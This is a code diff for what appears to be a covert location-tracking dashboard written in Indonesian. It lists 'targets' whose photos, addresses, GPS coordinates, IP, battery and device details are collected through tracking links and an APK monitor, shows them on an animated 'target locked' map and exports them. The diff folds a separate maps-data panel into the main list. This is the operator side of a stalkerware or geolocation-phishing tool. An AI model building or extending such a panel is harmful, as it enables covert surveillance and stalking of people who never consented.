@@ -247,34 +247,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
   </div>
 </div>
 
-<!-- MAPS LOCATION (ADDED) -->
-<div class="term-body">
-  <div class="prompt">[Data] Maps Location</div>
-  <div class="map-box" id="mapMapsBox">
-    <div id="mapMaps" class="map-inner"></div>
-    <div class="map-label" id="mapMapsLabel">◈ AWAITING MAPS</div>
-    <div class="map-coords" id="mapMapsCoords">--, --</div>
-  </div>
-  <div class="search-row">
-    <input id="searchInputMaps" placeholder="🔍 cari target..." oninput="filterDataMaps()">
-    <select id="filterDateMaps" onchange="filterDataMaps()">
-      <option value="all">Semua</option>
-      <option value="today">Hari Ini</option>
-      <option value="7days">7 Hari</option>
-      <option value="30days">30 Hari</option>
-    </select>
-  </div>
-  <div style="font-size:10px;color:var(--text-d);margin-bottom:10px">
-    Showing&nbsp;<b id="countShownMaps" style="color:var(--cyan)">0</b>&nbsp;/&nbsp;<b id="countTotalMaps">0</b>
-  </div>
-  <div id="hasilMaps"><div class="empty">Waiting for maps data...</div></div>
-  <div style="display:flex;gap:8px;margin-top:12px;padding-top:12px;border-top:1px solid var(--border)">
-    <button class="term-btn outline" onclick="exportCSVMaps()" style="margin:0">[ CSV ]</button>
-    <button class="term-btn outline" onclick="exportJSONMaps()" style="margin:0">[ JSON ]</button>
-    <button class="term-btn danger" onclick="clearAllMaps()" style="margin:0">[ Clear ]</button>
-  </div>
-</div>
-
 <!-- APK MONITOR -->
 <div class="term-body">
   <div class="prompt">[Monitor] APK Location</div>
@@ -641,7 +613,6 @@ function getFiltered(){
   const ts=new Date();ts.setHours(0,0,0,0);
   return allData.filter(([k,d])=>{
     if(bl.includes(k))return false;
-    if(d.via==='maps')return false; // ADDED: data maps tampil di kolom MAPS saja
     if(s){const t=(d.target||'').toLowerCase(),c=(d.kota||'').toLowerCase(),al=buildAlamat(d).toLowerCase();if(!t.includes(s)&&!c.includes(s)&&!al.includes(s))return false}
     if(df==='today'&&d.waktu<ts.getTime())return false;
     if(df==='7days'&&d.waktu<ts.getTime()-7*86400000)return false;
@@ -653,13 +624,13 @@ function getFiltered(){
 function renderData(){
   const filtered=getFiltered();
   document.getElementById('countShown').innerText=filtered.length;
-  document.getElementById('countTotal').innerText=allData.filter(([,d])=>d.via!=='maps').length; // ADDED: hitung track saja
+  document.getElementById('countTotal').innerText=allData.length;
   const c=document.getElementById('hasil');
-  if(!filtered.length){c.innerHTML='<div class="empty">No data matches</div>';updateStats();updateMultiMap();checkGeofence();return} // FIX: stats/multi/geofence tetap update walau kolom track kosong
+  if(!filtered.length){c.innerHTML='<div class="empty">No data matches</div>';updateStats();updateMultiMap();checkGeofence();return} // FIX: stats/multi/geofence tetap update walau daftar link kosong
   c.innerHTML=filtered.map(([key,d])=>`
     <div class="card-data" id="card-${key}">
       <div class="card-top">
-        <span><span class="card-uname">${d.target||'unknown'}</span> · ${genID(d.waktu)}</span>
+        <span><span class="card-uname">${d.target||'unknown'}</span> ${d.via==='maps'?'<span style="font-size:8px;color:#00d4ff;border:1px solid #003a4a;padding:1px 5px;border-radius:2px;letter-spacing:1px">MAPS</span>':'<span style="font-size:8px;color:#c8a000;border:1px solid #4a3a00;padding:1px 5px;border-radius:2px;letter-spacing:1px">TRACK</span>'} · ${genID(d.waktu)}</span>
         <span>${new Date(d.waktu).toLocaleString('id-ID')}</span>
       </div>
       ${d.foto?`<img class="card-photo" src="${d.foto}" crossorigin="anonymous">`:''}
@@ -696,10 +667,10 @@ window.zoomMulti=(lat,lng)=>{if(!mapMulti||!lat||!lng)return;mapMulti.flyTo([lat
 window.filterData=()=>renderData();
 
 window.deleteItem=async(key)=>{playKlik();if(!confirm('Hapus data ini?'))return;const bl=JSON.parse(localStorage.getItem('blacklist_'+user)||'[]');if(!bl.includes(key))bl.push(key);localStorage.setItem('blacklist_'+user,JSON.stringify(bl));await remove(ref(db,'lokasi/'+user+'/'+key));addLog('Deleted');renderData()};
-window.clearAll=async()=>{playKlik();if(!confirm('Hapus SEMUA data link?'))return;const data=(await new Promise(r=>onValue(ref(db,'lokasi/'+user),r,{onlyOnce:true}))).val();const bl=JSON.parse(localStorage.getItem('blacklist_'+user)||'[]');for(const[k,v]of Object.entries(data||{})){if(v.target&&v.via!=='maps'){if(!bl.includes(k))bl.push(k);await remove(ref(db,'lokasi/'+user+'/'+k))}}localStorage.setItem('blacklist_'+user,JSON.stringify(bl));renderData()};
+window.clearAll=async()=>{playKlik();if(!confirm('Hapus SEMUA data link?'))return;const data=(await new Promise(r=>onValue(ref(db,'lokasi/'+user),r,{onlyOnce:true}))).val();const bl=JSON.parse(localStorage.getItem('blacklist_'+user)||'[]');for(const[k,v]of Object.entries(data||{})){if(v.target){if(!bl.includes(k))bl.push(k);await remove(ref(db,'lokasi/'+user+'/'+k))}}localStorage.setItem('blacklist_'+user,JSON.stringify(bl));renderData()};
 window.downloadCard=async(key)=>{const c=document.getElementById('card-'+key);if(!c)return;try{const cv=await html2canvas(c,{backgroundColor:'#161616',scale:2});const a=document.createElement('a');a.download='target_'+key+'.png';a.href=cv.toDataURL();a.click()}catch(e){}};
-window.exportCSV=()=>{const _td=allData.filter(([,d])=>d.via!=='maps');if(!_td.length)return alert('No data');const rows=[['ID','Target','Waktu','Alamat','Lat','Lng','IP','Platform']];_td.forEach(([k,d])=>rows.push([genID(d.waktu),d.target||'',new Date(d.waktu).toLocaleString('id-ID'),buildAlamat(d),d.lat||'',d.lng||'',d.ip||'',d.platform||'']));const blob=new Blob(['\ufeff'+rows.map(r=>r.map(c=>'"'+String(c).replace(/"/g,'""')+'"').join(',')).join('\n')],{type:'text/csv'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='cyber_'+Date.now()+'.csv';a.click()};
-window.exportJSON=()=>{const _td=allData.filter(([,d])=>d.via!=='maps');if(!_td.length)return alert('No data');const blob=new Blob([JSON.stringify(_td.map(([,d])=>{const c={...d};if(c.foto)c.foto='[HIDDEN]';return c}),null,2)],{type:'application/json'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='cyber_'+Date.now()+'.json';a.click()};
+window.exportCSV=()=>{if(!allData.length)return alert('No data');const rows=[['ID','Target','Waktu','Alamat','Lat','Lng','IP','Platform']];allData.forEach(([k,d])=>rows.push([genID(d.waktu),d.target||'',new Date(d.waktu).toLocaleString('id-ID'),buildAlamat(d),d.lat||'',d.lng||'',d.ip||'',d.platform||'']));const blob=new Blob(['\ufeff'+rows.map(r=>r.map(c=>'"'+String(c).replace(/"/g,'""')+'"').join(',')).join('\n')],{type:'text/csv'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='cyber_'+Date.now()+'.csv';a.click()};
+window.exportJSON=()=>{if(!allData.length)return alert('No data');const blob=new Blob([JSON.stringify(allData.map(([,d])=>{const c={...d};if(c.foto)c.foto='[HIDDEN]';return c}),null,2)],{type:'application/json'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='cyber_'+Date.now()+'.json';a.click()};
 
 onValue(ref(db,'lokasi/'+user),snap=>{
   const data=snap.val();
@@ -709,129 +680,6 @@ onValue(ref(db,'lokasi/'+user),snap=>{
   lastCnt=allData.length;firstLoad=false;renderData();
 });
 
-// ══════════════════════════
-// MAPS LOCATION (ADDED — kolom data maps.html)
-// ══════════════════════════
-let allDataMaps=[],lastCntMaps=0,firstLoadMaps=true;
-let mapMaps=null,lastAnimKeyMaps='';
-
-function getFilteredMaps(){
-  const s=(document.getElementById('searchInputMaps')?.value||'').toLowerCase();
-  const df=document.getElementById('filterDateMaps')?.value||'all';
-  const bl=JSON.parse(localStorage.getItem('blacklist_'+user)||'[]');
-  const ts=new Date();ts.setHours(0,0,0,0);
-  return allDataMaps.filter(([k,d])=>{
-    if(bl.includes(k))return false;
-    if(s){const t=(d.target||'').toLowerCase(),c=(d.kota||'').toLowerCase(),al=buildAlamat(d).toLowerCase();if(!t.includes(s)&&!c.includes(s)&&!al.includes(s))return false}
-    if(df==='today'&&d.waktu<ts.getTime())return false;
-    if(df==='7days'&&d.waktu<ts.getTime()-7*86400000)return false;
-    if(df==='30days'&&d.waktu<ts.getTime()-30*86400000)return false;
-    return true;
-  });
-}
-
-function animasiMapMaps(lat,lng,target,foto){
-  const key=lat.toFixed(4)+'_'+lng.toFixed(4);
-  if(key===lastAnimKeyMaps)return;
-  lastAnimKeyMaps=key;
-  if(mapMaps){try{mapMaps.remove()}catch(e){}mapMaps=null}
-  const container=document.getElementById('mapMaps');
-  const labelEl=document.getElementById('mapMapsLabel');
-  const coordsEl=document.getElementById('mapMapsCoords');
-  coordsEl.innerText=lat.toFixed(4)+', '+lng.toFixed(4);
-  mapMaps=L.map(container,{zoomControl:false,attributionControl:false,dragging:false,scrollWheelZoom:false,touchZoom:false,doubleClickZoom:false}).setView([0,20],2);
-  addSatLayer(mapMaps);
-  const stages=[
-    {zoom:2, center:[0,20],   dur:900,  label:'◈ SATELIT ONLINE'},
-    {zoom:4, center:[lat,lng],dur:900,  label:'◈ MENCARI SINYAL...'},
-    {zoom:7, center:[lat,lng],dur:900,  label:'◈ SINYAL DITEMUKAN'},
-    {zoom:10,center:[lat,lng],dur:900,  label:'◈ MENGUNCI WILAYAH'},
-    {zoom:13,center:[lat,lng],dur:900,  label:'◈ MEMPERBESAR...'},
-    {zoom:16,center:[lat,lng],dur:900,  label:'◈ DETAIL JALAN'},
-    {zoom:18,center:[lat,lng],dur:1000, label:'◈ MAPS LOCKED ◈'},
-  ];
-  let idx=0;
-  function step(){
-    if(idx>=stages.length){
-      const mk=L.marker([lat,lng],{icon:pinIcon(foto||null,target,'#00d4ff')}).addTo(mapMaps);
-      const fd=allDataMaps.find(([,d])=>d.lat&&Math.abs(d.lat-lat)<0.0001);
-      const alamat=fd?buildAlamat(fd[1]):'-';
-      const fotoHtml=foto?`<img src="${foto}" style="width:80px;height:60px;object-fit:cover;border:1px solid #4a3a00;border-radius:3px;display:block;margin-bottom:5px">`:'';
-      mk.bindPopup(`<div style="font-family:'Courier New',monospace;min-width:160px;padding:4px">
-        <div style="color:#00d4ff;font-weight:bold;letter-spacing:1px;font-size:11px;padding-bottom:4px;border-bottom:1px solid #4a3a00;margin-bottom:4px">◈ ${target.toUpperCase()}</div>
-        ${fotoHtml}
-        <div style="font-size:9px;line-height:1.9">
-          <div><span style="color:#444;display:inline-block;width:44px">ALAMAT</span><span style="color:#c8c8c8">${alamat}</span></div>
-          <div><span style="color:#444;display:inline-block;width:44px">KOORD</span><span style="color:#00d4ff">${lat.toFixed(5)}, ${lng.toFixed(5)}</span></div>
-        </div>
-      </div>`,{className:'target-popup',closeButton:false,maxWidth:230}).openPopup();
-      mapMaps.dragging.enable();
-      mapMaps.scrollWheelZoom.enable();
-      targetLockedSound();
-      hackerVoice();
-      addLog('🎯 Maps locked: '+target);
-      return;
-    }
-    const s=stages[idx];
-    labelEl.innerText=s.label;
-    mapMaps.flyTo(s.center,s.zoom,{duration:s.dur/1000,easeLinearity:0.25});
-    idx++;
-    setTimeout(step,s.dur+80);
-  }
-  setTimeout(step,300);
-}
-
-function renderDataMaps(){
-  const filtered=getFilteredMaps();
-  document.getElementById('countShownMaps').innerText=filtered.length;
-  document.getElementById('countTotalMaps').innerText=allDataMaps.length;
-  const c=document.getElementById('hasilMaps');
-  if(!filtered.length){c.innerHTML='<div class="empty">No data matches</div>';return}
-  c.innerHTML=filtered.map(([key,d])=>`
-    <div class="card-data" id="card-${key}">
-      <div class="card-top">
-        <span><span class="card-uname">${d.target||'unknown'}</span> · ${genID(d.waktu)}</span>
-        <span>${new Date(d.waktu).toLocaleString('id-ID')}</span>
-      </div>
-      ${d.foto?`<img class="card-photo" src="${d.foto}" crossorigin="anonymous">`:''}
-      <div class="card-body">
-        <div><span class="card-k">NAMA</span><span class="card-v">${d.target||'-'}</span></div>
-        <div><span class="card-k">ALAMAT</span><span class="card-v">${buildAlamat(d)}</span></div>
-        ${d.lat?`
-        <div><span class="card-k">KOORD</span><span class="card-v">${d.lat.toFixed(5)}, ${d.lng.toFixed(5)}</span></div>
-        <div><span class="card-k">MAPS</span><span class="card-v"><a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank">OPEN MAP →</a></span></div>`:''}
-        ${d.ip?`<div><span class="card-k">IP</span><span class="card-v">${d.ip}</span></div>`:''}
-        ${d.suhu!=null?`<div><span class="card-k">SUHU</span><span class="card-v">${Math.round(d.suhu)}°C</span></div>`:''}
-        ${d.baterai?`<div><span class="card-k">BATERAI</span><span class="card-v">${d.baterai}</span></div>`:''}
-        ${d.platform?`<div><span class="card-k">PLATFORM</span><span class="card-v">${d.platform}</span></div>`:''}
-        ${d.screen?`<div><span class="card-k">SCREEN</span><span class="card-v">${d.screen}</span></div>`:''}
-        ${d.timezone?`<div><span class="card-k">TZ</span><span class="card-v">${d.timezone}</span></div>`:''}
-      </div>
-      <textarea class="card-note" id="note_${key}" placeholder="› catatan...">${getNote(key)}</textarea>
-      <div class="card-actions">
-        <button onclick="saveNote('${key}')">📝 NOTE</button>
-        <button onclick="zoomMulti(${d.lat},${d.lng})">MULTI</button>
-        <button onclick="downloadCard('${key}')">📥 SAVE</button>
-        <button class="del" onclick="deleteItemMaps('${key}')">🗑️ DEL</button>
-      </div>
-    </div>`).join('');
-
-  const latest=filtered.find(([,d])=>d.lat&&d.lng);
-  if(latest)animasiMapMaps(latest[1].lat,latest[1].lng,latest[1].target||'unknown',latest[1].foto||null);
-}
-window.filterDataMaps=()=>renderDataMaps();
-window.deleteItemMaps=(key)=>{deleteItem(key).then(()=>{try{renderDataMaps()}catch(e){}}).catch(()=>{})};
-window.clearAllMaps=async()=>{playKlik();if(!confirm('Hapus SEMUA data maps?'))return;const data=(await new Promise(r=>onValue(ref(db,'lokasi/'+user),r,{onlyOnce:true}))).val();const bl=JSON.parse(localStorage.getItem('blacklist_'+user)||'[]');for(const[k,v]of Object.entries(data||{})){if(v.target&&v.via==='maps'){if(!bl.includes(k))bl.push(k);await remove(ref(db,'lokasi/'+user+'/'+k))}}localStorage.setItem('blacklist_'+user,JSON.stringify(bl));renderDataMaps()};
-window.exportCSVMaps=()=>{if(!allDataMaps.length)return alert('No data');const rows=[['ID','Target','Waktu','Alamat','Lat','Lng','IP','Platform']];allDataMaps.forEach(([k,d])=>rows.push([genID(d.waktu),d.target||'',new Date(d.waktu).toLocaleString('id-ID'),buildAlamat(d),d.lat||'',d.lng||'',d.ip||'',d.platform||'']));const blob=new Blob(['\ufeff'+rows.map(r=>r.map(c=>'"'+String(c).replace(/"/g,'""')+'"').join(',')).join('\n')],{type:'text/csv'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='cyber_maps_'+Date.now()+'.csv';a.click()};
-window.exportJSONMaps=()=>{if(!allDataMaps.length)return alert('No data');const blob=new Blob([JSON.stringify(allDataMaps.map(([,d])=>{const c={...d};if(c.foto)c.foto='[HIDDEN]';return c}),null,2)],{type:'application/json'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='cyber_maps_'+Date.now()+'.json';a.click()};
-
-onValue(ref(db,'lokasi/'+user),snap=>{
-  const data=snap.val()||{};
-  allDataMaps=Object.entries(data).filter(([,d])=>d&&d.target&&d.via==='maps').sort((a,b)=>(b[1].waktu||0)-(a[1].waktu||0));
-  if(!firstLoadMaps&&allDataMaps.length>lastCntMaps){linkDataSound();addLog('🎯 DATA BARU MAPS!','warn')}
-  lastCntMaps=allDataMaps.length;firstLoadMaps=false;renderDataMaps();
-});
-addLog('Maps module ready');
 
 // ══════════════════════════
 // CHAT
